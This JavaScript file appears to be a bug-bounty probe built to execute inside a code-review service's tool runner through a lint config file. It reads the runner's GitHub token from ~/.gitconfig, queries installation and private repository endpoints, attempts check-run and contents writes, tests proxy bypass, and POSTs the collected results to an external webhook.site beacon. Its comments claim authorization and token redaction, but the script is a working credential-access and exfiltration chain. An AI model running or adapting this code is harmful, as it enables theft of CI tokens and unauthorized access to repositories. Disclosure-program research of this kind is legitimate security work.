// apprepo_battery.js — APPREPO lane, R3a installation-scope hinge + app-credential
// permission ceiling battery. Authorized CodeRabbit VDP; executes at analyzer-config
// load time inside the review tool-runner (EXECCHAIN-01 .prismalintrc.js vehicle).
// OWN repositories only (accounts C3/B, all coderabbit-vdp-* prefixed).
// Secrets NEVER enter the report: the Proxy-Tokenizer is reduced to name/len/p4/sha8
// at source. All target probes paced >=1s. If /installation/repositories lists any
// repository not prefixed coderabbit-vdp- the name is redacted and repo-targeted
// probes are skipped (cross-tenant shape recorded, nothing touched).
const cp = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");

const OAST = "https://webhook.site/470db94a-f352-4633-a72a-04de54fc35e2/apprepo";               // researcher-owned webhook.site beacon
const OWN = "coderabbit-vdp-";
const O = "coderabbit-vdp-research3";
const R = "coderabbit-vdp-runnerident";
const PRIV3 = O + "/taskforge-lab2-20260928";   // own private repo, same account
const BRANCH = "apprepo-r3a-1";
const OUT = [];

function sh(cmd, tmo) {
  try {
    return String(cp.execSync(cmd, { timeout: tmo || 20000, encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"], maxBuffer: 8 * 1024 * 1024 }));
  } catch (e) {
    return String(e.stdout || "") + String(e.stderr || "");
  }
}
function step(lab, cmd, tmo) {
  const flat = sh(cmd, tmo).replace(/\s+/g, " ").trim();
  OUT.push(lab + "=" + flat.slice(0, 500));
  return flat;
}
function q(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
function pace() { sh("sleep 1", 5000); }
function code(s) { const m = String(s || "").match(/\b(\d{3})\b/); return m ? m[1] : "?"; }
function sha8(s) { return crypto.createHash("sha256").update(String(s)).digest("hex").slice(0, 8); }
function body(lab, f) { step(lab, "head -c 300 " + f + " 2>/dev/null || echo NOFILE"); }
function jget(f) {
  try { return JSON.parse(fs.readFileSync(f, "utf8")); } catch (e) { return null; }
}
function hdrs(lab, f) {
  step(lab, "grep -iE '^(HTTP|date|x-github-request-id|x-ratelimit-|content-type|etag)' " + f +
       " 2>/dev/null | tr '\\n' ' ' || echo NOHDRFILE");
}
// generic GitHub probe through the egress sidecar
function gh(lab, url, extra, outfile, hdrfile, tmo) {
  pace();
  const c = "curl -sS -m 15 " + PX + (extra || "") +
    (hdrfile ? " -D " + hdrfile : "") + (outfile ? " -o " + outfile : " -o /dev/null") +
    " -w '%{http_code}' " + q(url);
  return step(lab, c, tmo || 25000);
}

let PX = "-x http://127.0.0.1:1080 ";
let H = "";

function run() {
  // ------------------------------------------------------------ 1. token shape
  let gcfg = "";
  try { gcfg = fs.readFileSync(os.homedir() + "/.gitconfig", "utf8"); }
  catch (e) { OUT.push("GITCONFIG_ERR=" + (e.code || e.message)); }
  OUT.push("GITCONFIG len=" + gcfg.length + " sha8=" + sha8(gcfg));
  const pm = gcfg.match(/^\s*proxy\s*=\s*(.*)$/mi);
  OUT.push("GIT_PROXY " + (pm ? pm[1].trim() : "none"));
  const m = gcfg.match(/^\s*extraheader\s*=\s*(.*)$/mi);
  let tokName = "none", tok = "";
  if (m) {
    const line = m[1].trim();
    const i = line.indexOf(":");
    tokName = i >= 0 ? line.slice(0, i).trim() : "?";
    tok = i >= 0 ? line.slice(i + 1).trim() : "";
    H = " -H " + q(line);
    OUT.push("TOKEN name=" + tokName + " len=" + tok.length + " p4=" + tok.slice(0, 4) +
             " sha8=" + sha8(tok));
  } else {
    OUT.push("TOKEN none");
  }
  const t0 = Date.now();
  OUT.push("T0=" + new Date(t0).toISOString());

  // ------------------------------------------------------------ 2. R3a hinge
  const X1 = gh("X1_INSTALL_REPOS",
    "https://api.github.com/installation/repositories?per_page=100",
    H, "/tmp/ar_i1.json", "/tmp/ar_h1.txt", 30000);
  hdrs("X1_HDRS", "/tmp/ar_h1.txt");
  const j1 = jget("/tmp/ar_i1.json");
  let cross = 0, red = 0;
  const names = [];
  if (j1 && Array.isArray(j1.repositories)) {
    for (const r of j1.repositories) {
      const fn = String((r && r.full_name) || "");
      if (fn.indexOf(OWN) === 0) names.push(fn + (r.private ? "[private]" : ""));
      else { cross++; red++; names.push("REDACTED_" + red); }
    }
  } else if (j1 && j1.message) {
    OUT.push("X1_MSG=" + String(j1.message).slice(0, 120));
  } else {
    OUT.push("X1_PARSE_OR_EMPTY");
  }
  OUT.push("X1 total_count=" + (j1 ? j1.total_count : "na") +
           " selection=" + (j1 ? j1.repository_selection : "na") +
           " has_more=" + (j1 ? j1.has_more : "na") +
           " listed=" + names.length + " cross=" + cross);
  OUT.push("X1_REPOS " + names.join(","));

  // ------------------------------------------- 3. introspection / app routes
  gh("X2_APP_INSTALLATIONS", "https://api.github.com/app/installations?per_page=10",
     H, "/tmp/ar_x2.json"); body("X2_BODY", "/tmp/ar_x2.json");
  gh("X3_USER", "https://api.github.com/user", H, "/tmp/ar_x3.json"); body("X3_BODY", "/tmp/ar_x3.json");
  gh("X4_USER_INSTALLATIONS", "https://api.github.com/user/installations?per_page=10",
     H, "/tmp/ar_x4.json"); body("X4_BODY", "/tmp/ar_x4.json");
  gh("X5_REPO_INSTALLATION", "https://api.github.com/repos/" + O + "/" + R + "/installation",
     H, "/tmp/ar_x5.json"); body("X5_BODY", "/tmp/ar_x5.json");

  // ------------------------------------------- 4. repo-permission matrix (own)
  let p6c = "?", p7c = "?", p8c = "-";
  if (cross === 0) {
    gh("P1_CONTENTS_PUBLIC", "https://api.github.com/repos/" + O + "/" + R + "/contents",
       H, "/tmp/ar_p1.json");
    step("P1_NAMES", "grep -oE '\"name\": *\"[^\"]*\"' /tmp/ar_p1.json 2>/dev/null | head -6");
    gh("P2_PRIVATE_REPO_GET", "https://api.github.com/repos/" + PRIV3, H, "/tmp/ar_p2.json");
    body("P2_BODY", "/tmp/ar_p2.json");
    gh("P3_PRIVATE_CONTENTS", "https://api.github.com/repos/" + PRIV3 + "/contents",
       H, "/tmp/ar_p3.json"); body("P3_BODY", "/tmp/ar_p3.json");
    gh("P4_PRS_READ_REVIEWING_REPO",
       "https://api.github.com/repos/" + O + "/" + R +
       "/pulls?state=open&head=" + O + ":" + BRANCH, H, "/tmp/ar_p4.json");
    step("P4_NUMS", "grep -oE '\"number\": *[0-9]+' /tmp/ar_p4.json 2>/dev/null | head -3");

    // listed PRIVATE own repos (the run-scoped vs installation-wide discriminator)
    let testedPriv = 0;
    if (j1 && Array.isArray(j1.repositories)) {
      for (const r of j1.repositories) {
        if (testedPriv >= 2) break;
        const fn = String((r && r.full_name) || "");
        if (fn.indexOf(OWN) !== 0 || !r.private) continue;
        testedPriv++;
        gh("P5LIST_REPO_" + testedPriv, "https://api.github.com/repos/" + fn, H,
           "/tmp/ar_p5r" + testedPriv + ".json");
        body("P5LIST_BODY_" + testedPriv, "/tmp/ar_p5r" + testedPriv + ".json");
        gh("P5LIST_CONTENTS_" + testedPriv, "https://api.github.com/repos/" + fn + "/contents",
           H, "/tmp/ar_p5c" + testedPriv + ".json");
        body("P5LIST_CBODY_" + testedPriv, "/tmp/ar_p5c" + testedPriv + ".json");
      }
      if (testedPriv === 0) OUT.push("P5LIST none-listed-private");
    }

    // checks:write — INVALID payload first (403 = denied; 422 = authz passed, no object created)
    pace();
    p6c = code(step("P6_CHECKS_WRITE_INVALID",
      "curl -sS -m 15 " + PX + H +
      " -H 'Content-Type: application/json' -d '{}' -o /tmp/ar_p6.json -w '%{http_code}' " +
      q("https://api.github.com/repos/" + O + "/" + R + "/check-runs"), 25000));
    body("P6_BODY", "/tmp/ar_p6.json");
    // contents:write via API — INVALID payload (missing content => cannot create a file)
    pace();
    p7c = code(step("P7_CONTENTS_WRITE_INVALID",
      "curl -sS -m 15 " + PX + H + " -X PUT" +
      " -H 'Content-Type: application/json' -d '{\"message\":\"apprepo scope probe\"}'" +
      " -o /tmp/ar_p7.json -w '%{http_code}' " +
      q("https://api.github.com/repos/" + O + "/" + R + "/contents/apprepo_write_probe.md"), 25000));
    body("P7_BODY", "/tmp/ar_p7.json");

    // P8 — ONLY if authz was proven ambiguous-positive (422): one VALID check-run create.
    // Authorized => 201 (capability demo, 1 mutation, own repo); denied => 403 (no object).
    if (p6c === "422") {
      let head = String(sh("git rev-parse HEAD", 10000)).trim();
      if (!/^[0-9a-f]{40}$/.test(head)) {
        // fallback: head sha from the P4 pulls response
        head = String(sh("grep -A100 '\"ref\": *\"" + BRANCH + "\"' /tmp/ar_p4.json 2>/dev/null | " +
                         "grep -oE '\"sha\": *\"[0-9a-f]{40}\"' | head -1 | " +
                         "grep -oE '[0-9a-f]{40}'", 10000)).trim();
      }
      if (/^[0-9a-f]{40}$/.test(head)) {
        pace();
        p8c = code(step("P8_CHECKS_WRITE_VALID",
          "curl -sS -m 15 " + PX + H +
          " -H 'Content-Type: application/json' -d " +
          q(JSON.stringify({ name: "APPREPO scope probe (authorized VDP)",
                             head_sha: head, status: "completed", conclusion: "neutral",
                             output: { title: "APPREPO R3a",
                                       summary: "Capability probe: runner-code check-run write." } })) +
          " -o /tmp/ar_p8.json -w '%{http_code}' " +
          q("https://api.github.com/repos/" + O + "/" + R + "/check-runs"), 25000));
        body("P8_BODY", "/tmp/ar_p8.json");
      } else {
        OUT.push("P8_SKIPPED bad-head=" + head.slice(0, 12));
      }
    }
  } else {
    OUT.push("MATRIX_SKIPPED cross-tenant shape recorded; no repo-targeted probes");
  }

  // ------------------------------------------------------------ 5. negative guards
  pace();
  const n1 = step("N1_SIDECAR_NO_HEADER_USER",
    "curl -sS -m 12 -x http://127.0.0.1:1080 -o /tmp/ar_n1.json -w '%{http_code}' " +
    "https://api.github.com/user");
  body("N1_BODY", "/tmp/ar_n1.json");
  pace();
  const n4 = step("N4_DIRECT_WITH_HEADER_USER",
    "env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u all_proxy -u ALL_PROXY " +
    "curl -sS -m 12 --noproxy '*'" + H +
    " -o /tmp/ar_n4.json -w '%{http_code}' https://api.github.com/user");
  body("N4_BODY", "/tmp/ar_n4.json");

  // ------------------------------------------------------------ 6. exfil part 1
  const part1 = [
    "APPREPO tool-runner battery part1 — authorized CodeRabbit VDP, OWN repos only",
    "ts=" + new Date().toISOString() + " home=" + os.homedir(),
  ].concat(OUT).join("\n");
  let xf1 = "?";
  // POST of the report via temp file (no process substitution in execSync's sh)
  try { fs.writeFileSync("/tmp/ar_part1.txt", part1); } catch (e) {}
  for (let i = 0; i < 2; i++) {
    xf1 = step("XF1",
      "curl -sS -m 25 -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: text/plain' " +
      "--data-binary @/tmp/ar_part1.txt " + OAST + "/p1?try=" + (i + 1), 30000);
    if (String(xf1).indexOf("200") >= 0) break;
    pace();
  }

  // ------------------------------------------------------------ 7. exchange timing (>=60s)
  const sleepSec = 62;
  sh("sleep " + sleepSec, sleepSec * 1000 + 5000);
  const X1b = gh("X1B_INSTALL_REPOS",
    "https://api.github.com/installation/repositories?per_page=100",
    H, "/tmp/ar_i2.json", "/tmp/ar_h2.txt", 30000);
  hdrs("X1B_HDRS", "/tmp/ar_h2.txt");
  const gap = Math.round((Date.now() - t0) / 1000);
  OUT.push("T1=" + new Date().toISOString() + " GAP_SEC=" + gap);

  // token-echo scan of both header dumps: material would be reported len/p4/sha8 only
  let echoFound = 0;
  for (const f of ["/tmp/ar_h1.txt", "/tmp/ar_h2.txt"]) {
    let s = "";
    try { s = fs.readFileSync(f, "utf8"); } catch (e) { OUT.push("HDRREAD_ERR " + f); continue; }
    const hit = s.match(/gh[sop]_[A-Za-z0-9]{4,}|github_pat_[A-Za-z0-9_]{4,}|authorization:\s*\S+|set-cookie:\s*\S+/i);
    if (hit) { echoFound++; OUT.push("ECHO_MATERIAL " + f + " len=" + hit[0].length +
                                      " p4=" + hit[0].slice(0, 4) + " sha8=" + sha8(hit[0])); }
    else { OUT.push("ECHO_NONE " + f); }
  }
  OUT.push("ECHO_SUM found=" + echoFound);

  // ------------------------------------------------------------ 8. exfil part 2
  const part2 = [
    "APPREPO tool-runner battery part2 — timing + echo scan",
    "ts=" + new Date().toISOString(),
  ].concat(OUT.slice(-8)).join("\n");
  let xf2 = "?";
  try { fs.writeFileSync("/tmp/ar_part2.txt", part2); } catch (e) {}
  for (let i = 0; i < 2; i++) {
    xf2 = step("XF2",
      "curl -sS -m 25 -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: text/plain' " +
      "--data-binary @/tmp/ar_part2.txt " + OAST + "/p2?try=" + (i + 1), 30000);
    if (String(xf2).indexOf("200") >= 0) break;
    pace();
  }

  // ------------------------------------------------------------ 9. compact marker
  const verdict = [
    "AR",
    "i" + code(X1) + "c" + names.length,
    "x" + code(OUT.find(l => l.startsWith("X2_APP_INSTALLATIONS=")) || ""),
    "u" + code(X3of()),
    "s" + code(findPref("X4_USER_INSTALLATIONS=")),
    "r" + code(findPref("X5_REPO_INSTALLATION=")),
    cross ? "T" + cross : "",
    cross === 0 ? [
      "p" + code(findPref("P1_CONTENTS_PUBLIC=")),
      "v" + code(findPref("P2_PRIVATE_REPO_GET=")),
      "n" + code(findPref("P3_PRIVATE_CONTENTS=")),
      "q" + code(findPref("P4_PRS_READ_REVIEWING_REPO=")),
      "k" + p6c + "w" + p7c + (p8c === "-" ? "" : "V" + p8c),
    ].join("") : "MTXSKP",
    "g1" + code(n1) + "g4" + code(n4),
    "e" + code(X1b) + "t" + gap,
    "xf" + code(xf1) + "/" + code(xf2),
  ].filter(Boolean).join("_");
  return { verdict: verdict, report: part1 + "\n" + part2 };
}

function findPref(p) {
  const l = OUT.find(x => x.indexOf(p) === 0);
  return l ? l.slice(p.length) : "";
}
function X3of() { return findPref("X3_USER="); }

module.exports = { run: run };
